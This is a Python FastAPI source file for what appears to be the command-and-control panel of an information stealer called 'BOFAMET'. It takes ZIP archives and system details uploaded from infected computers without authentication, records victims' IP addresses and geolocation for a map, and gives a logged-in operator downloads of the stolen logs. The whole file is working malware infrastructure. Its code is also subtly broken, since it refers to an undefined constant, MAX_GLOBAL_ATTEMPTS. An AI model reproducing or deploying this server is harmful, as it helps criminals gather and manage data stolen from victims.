from fastapi import FastAPI, UploadFile, File, Form, Request, HTTPException, Depends
from fastapi.responses import HTMLResponse, FileResponse, RedirectResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from starlette.middleware.sessions import SessionMiddleware
from starlette import status
import uvicorn
import sqlite3
import os
import datetime
import zipfile
import shutil
import re 
import json
from typing import List, Dict
from starlette.background import BackgroundTasks
import sys
import subprocess
from fastapi.staticfiles import StaticFiles

NOHUP_LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'nohup.out')

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')

VALID_USERNAME = None
VALID_PASSWORD = None
LISTEN_PORT = None
GLOBAL_SECRET_KEY = None

app_config = {
    'UPLOAD_FOLDER': 'uploads', 
    'DATABASE': 'c2_logs.db',
    'PORT': 8000 
}


if not os.path.exists(app_config['UPLOAD_FOLDER']):
    os.makedirs(app_config['UPLOAD_FOLDER'])

templates = Jinja2Templates(directory="templates")

failed_login_attempts = {}
blocked_ips = {}
MAX_LOGIN_ATTEMPTS = 5
BLOCK_DURATION_MINUTES = 5

failed_login_attempts_global = 0
panel_permanently_blocked = False

BLOCK_DURATION = datetime.timedelta(minutes=5)
MAX_GLOBAL_FAILED_ATTEMPTS = 100

def init_db():
    conn = sqlite3.connect(app_config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            ip_address TEXT,
            computer_name TEXT,
            system_info_text TEXT,
            file_path TEXT NOT NULL,
            public_ip TEXT, 
            latitude REAL, 
            longitude REAL  
        )
    ''')
    conn.commit()
    conn.close()

def load_server_config():

    global VALID_USERNAME, VALID_PASSWORD, LISTEN_PORT, GLOBAL_SECRET_KEY

    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config_data = json.load(f)
                VALID_USERNAME = config_data.get('username')
                VALID_PASSWORD = config_data.get('password')
                LISTEN_PORT = config_data.get('port')
                GLOBAL_SECRET_KEY = bytes.fromhex(config_data.get('secret_key'))
                print("Server config loaded by server.py.")
                return True
        except (json.JSONDecodeError, KeyError, ValueError) as e:
            print(f"CRITICAL ERROR: Failed to load server configuration from {CONFIG_FILE}: {e}")
            print("Please run 'python Config_C2.py' to configure the server first!")
            sys.exit(1)
    else:
        print(f"CRITICAL ERROR: Configuration file '{CONFIG_FILE}' not found.")
        print("Please run 'python Config_C2.py' to configure the server first!")
        sys.exit(1)

load_server_config() 

app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)

app.mount("/static", StaticFiles(directory="static"), name="static")

if GLOBAL_SECRET_KEY:
    app.add_middleware(SessionMiddleware, secret_key=GLOBAL_SECRET_KEY)
else:
    print("CRITICAL ERROR: GLOBAL_SECRET_KEY not loaded. This should have been caught earlier.")
    sys.exit(1) 

app_config['PORT'] = LISTEN_PORT

init_db()

async def authenticate_user(request: Request):
    if panel_permanently_blocked:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Panel permanently blocked due to suspicious activity.",
        )

    if "authenticated" not in request.session or not request.session["authenticated"]:
        raise HTTPException(
            status_code=status.HTTP_303_SEE_OTHER,
            detail="Not authenticated",
            headers={"Location": "/login"}
        )
    
    current_ip = request.client.host
    session_ip = request.session.get('client_ip')

    if session_ip and session_ip != current_ip:
        request.session.clear()
        raise HTTPException(
            status_code=status.HTTP_303_SEE_OTHER,
            detail="IP address change detected, re-authentication required.",
            headers={"Location": "/login"}
        )

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
async def process_login(request: Request, username: str = Form(...), password: str = Form(...)):
    global failed_login_attempts_global, panel_permanently_blocked

    if panel_permanently_blocked:
        error_message = "Admin panel permanently blocked due to multiple suspicious login attempts. Server restart required."
        return templates.TemplateResponse("login.html", {"request": request, "error_message": error_message}, status_code=status.HTTP_403_FORBIDDEN)

    client_ip = request.client.host

    if client_ip in blocked_ips and datetime.datetime.now() < blocked_ips[client_ip]:
        remaining_time = blocked_ips[client_ip] - datetime.datetime.now()
        total_seconds = int(remaining_time.total_seconds())
        minutes = total_seconds // 60
        seconds = total_seconds % 60
        error_message = f"Your IP address is blocked. Remaining {minutes} minutes and {seconds} seconds."
        return templates.TemplateResponse("login.html", {"request": request, "error_message": error_message}, status_code=status.HTTP_403_FORBIDDEN)

    if username == VALID_USERNAME and password == VALID_PASSWORD:
        request.session['authenticated'] = True
        request.session['client_ip'] = client_ip
        if client_ip in failed_login_attempts:
            del failed_login_attempts[client_ip]
        failed_login_attempts_global = 0
        return RedirectResponse(url="/", status_code=status.HTTP_302_FOUND)
    else:
        failed_login_attempts_global += 1
        if failed_login_attempts_global >= MAX_GLOBAL_ATTEMPTS:
            panel_permanently_blocked = True
            error_message = "Admin panel permanently blocked due to excessive number of failed login attempts from different IP addresses."
            return templates.TemplateResponse("login.html", {"request": request, "error_message": error_message}, status_code=status.HTTP_403_FORBIDDEN)

        failed_login_attempts[client_ip] = failed_login_attempts.get(client_ip, 0) + 1

        if failed_login_attempts[client_ip] >= MAX_LOGIN_ATTEMPTS:
            blocked_until = datetime.datetime.now() + datetime.timedelta(minutes=BLOCK_DURATION_MINUTES)
            blocked_ips[client_ip] = blocked_until
            del failed_login_attempts[client_ip]
            error_message = f"Too many incorrect attempts. Your IP address is blocked for {BLOCK_DURATION_MINUTES} minutes."
            return templates.TemplateResponse("login.html", {"request": request, "error_message": error_message}, status_code=status.HTTP_403_FORBIDDEN)
        else:
            return templates.TemplateResponse("login.html", {"request": request, "error_message": "Invalid username or password."})

@app.get("/logout")
async def logout(request: Request):
    request.session.clear()
    return RedirectResponse(url="/login", status_code=status.HTTP_302_FOUND)

@app.get("/", response_class=HTMLResponse, dependencies=[Depends(authenticate_user)])
async def index(request: Request):
    conn = sqlite3.connect(app_config['DATABASE'])
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM logs ORDER BY timestamp DESC")
    logs_raw = cursor.fetchall()
    conn.close()

    logs_for_template = []
    for log_entry in logs_raw:
        log_dict = dict(log_entry)
        
        path_parts = log_dict['file_path'].split(os.sep)
        
        uploads_index = -1
        try:
            uploads_index = path_parts.index(app_config['UPLOAD_FOLDER'])
        except ValueError:
            folder_name = path_parts[-2] if len(path_parts) >= 2 else ""
            file_name = path_parts[-1]
        else:
            if uploads_index + 2 < len(path_parts):
                folder_name = path_parts[uploads_index + 1]
                file_name = path_parts[uploads_index + 2]
            else:
                folder_name = ""
                file_name = path_parts[-1]


        log_dict['download_url'] = request.url_for('download_file', folder_name=folder_name, file_name=file_name)
        log_dict['file_name_display'] = file_name

        logs_for_template.append(log_dict)

    return templates.TemplateResponse("index.html", {"request": request, "logs": logs_for_template})

@app.get("/api/locations", response_model=List[Dict], dependencies=[Depends(authenticate_user)])
async def get_locations_for_map():
    conn = sqlite3.connect(app_config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute("SELECT id, timestamp, computer_name, public_ip, latitude, longitude FROM logs WHERE latitude IS NOT NULL AND longitude IS NOT NULL")
    locations_raw = cursor.fetchall()
    conn.close()
    
    locations_data = []
    for loc_id, timestamp, computer_name, public_ip, lat, lon in locations_raw:
        locations_data.append({
            "id": loc_id,
            "timestamp": timestamp,
            "computer_name": computer_name,
            "public_ip": public_ip,
            "latitude": lat,
            "longitude": lon
        })
    return JSONResponse(content=locations_data)

@app.get("/api/server_logs_data", dependencies=[Depends(authenticate_user)])
async def get_server_logs_data():
    log_content = "No server logs found or 'nohup.out' file does not exist."
    try:
        if os.path.exists(NOHUP_LOG_FILE):
            with open(NOHUP_LOG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                log_content = f.read()
        else:
            log_content = f"Server log file '{NOHUP_LOG_FILE}' not found."
    except Exception as e:
        log_content = f"Error reading server log file: {e}"
        print(f"ERROR: Failed to read {NOHUP_LOG_FILE}: {e}")

    return JSONResponse(content={"log_content": log_content})

@app.get("/download_all_logs", dependencies=[Depends(authenticate_user)])
async def download_all_logs(background_tasks: BackgroundTasks):
    temp_zip_filename = f"BOFAMET_All_Logs_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    temp_zip_path = os.path.join(app_config['UPLOAD_FOLDER'], temp_zip_filename)

    try:
        with zipfile.ZipFile(temp_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(app_config['UPLOAD_FOLDER']):
                for file in files:
                    if file.endswith('.zip') or file.endswith('.txt'):
                        full_path = os.path.join(root, file)
                        arcname = os.path.relpath(full_path, app_config['UPLOAD_FOLDER'])
                        zipf.write(full_path, arcname)
        
        background_tasks.add_task(os.remove, temp_zip_path)
        
        return FileResponse(temp_zip_path, media_type="application/zip", filename=temp_zip_filename, 
                            headers={"Content-Disposition": f"attachment; filename={temp_zip_filename}"})
    except Exception as e:
        print(f"Error creating or sending bulk archive: {e}")
        raise HTTPException(status_code=500, detail="Error creating log archive!")

@app.post("/upload")
async def upload_log(request: Request, file: UploadFile = File(...), system_info: str = Form(...), latitude: float = Form(0.0), longitude: float = Form(0.0)):
    if not file:
        return {"message": "No file provided"}, 400

    if file.filename == '':
        return {"message": "Empty file name"}, 400

    if not file.filename.lower().endswith('.zip'):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Only ZIP archives are allowed!"
        )
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_ip = request.client.host

    computer_name_match = re.search(r"🖥️ <b>Computer:</b> <code>(.*?)</code>", system_info)
    public_ip_match = re.search(r"🌍 <b>Public IP:</b> <code>(.*?)</code>", system_info)
    
    computer_name = computer_name_match.group(1) if computer_name_match else "Unknown computer"
    public_ip = public_ip_match.group(1) if public_ip_match else "Unknown IP"

    conn = sqlite3.connect(app_config['DATABASE'])
    cursor = conn.cursor()

    cursor.execute(
        "SELECT id, file_path FROM logs WHERE computer_name = ? AND public_ip = ?",
        (computer_name, public_ip)
    )
    existing_log = cursor.fetchone()

    if existing_log:
        old_log_id, old_file_path = existing_log
        old_log_folder = os.path.dirname(old_file_path)

        cursor.execute("DELETE FROM logs WHERE id = ?", (old_log_id,))
        conn.commit()

        if os.path.exists(old_log_folder) and os.path.isdir(old_log_folder):
            try:
                shutil.rmtree(old_log_folder)
                print(f"Old log folder deleted: {old_log_folder}")
            except Exception as e:
                print(f"Error deleting old log folder {old_log_folder}: {e}")
        else:
            print(f"Old log folder not found or is not a directory: {old_log_folder}")


    log_folder_name = f"{public_ip}_{computer_name}_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"
    log_folder_path = os.path.join(app_config['UPLOAD_FOLDER'], log_folder_name)
    os.makedirs(log_folder_path, exist_ok=True)

    file_save_path = os.path.join(log_folder_path, file.filename)
    with open(file_save_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    info_file_path = os.path.join(log_folder_path, "system_info.txt")
    with open(info_file_path, 'w', encoding='utf-8') as f:
        f.write(system_info)

    cursor.execute(
        "INSERT INTO logs (timestamp, ip_address, computer_name, system_info_text, file_path, public_ip, latitude, longitude) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        (timestamp, client_ip, computer_name, system_info, file_save_path, public_ip, latitude, longitude)
    )
    conn.commit()
    conn.close()

    return {"message": "Log uploaded successfully!"}

@app.get("/download/{folder_name}/{file_name}", dependencies=[Depends(authenticate_user)])
async def download_file(folder_name: str, file_name: str):
    full_file_path = os.path.join(app_config['UPLOAD_FOLDER'], folder_name, file_name)
    if not os.path.exists(full_file_path):
        return {"message": "File not found!"}, 404
    
    return FileResponse(full_file_path, media_type="application/zip", filename=file_name)

if __name__ == '__main__':
    load_server_config() 
    
    app.SECRET_KEY = GLOBAL_SECRET_KEY
    app.add_middleware(SessionMiddleware, secret_key=app.SECRET_KEY)
    
    app_config['PORT'] = LISTEN_PORT 

    init_db() 

    print(f"Starting server on http://0.0.0.0:{app_config['PORT']}")
    uvicorn.run(app, host='0.0.0.0', port=app_config['PORT']) 